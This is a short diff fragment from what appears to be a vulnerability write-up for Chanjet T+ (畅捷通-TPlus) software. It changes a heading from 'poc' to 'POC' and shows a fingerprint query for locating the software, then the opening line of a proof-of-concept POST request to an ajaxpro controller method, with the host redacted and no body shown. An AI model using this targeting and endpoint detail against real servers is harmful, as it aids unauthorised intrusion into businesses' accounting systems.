@@ -8,7 +8,7 @@
 app="畅捷通-TPlus"
 ```
 
-## poc
+## POC
 ```
 POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearController,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1
 Host: [已模糊处理]
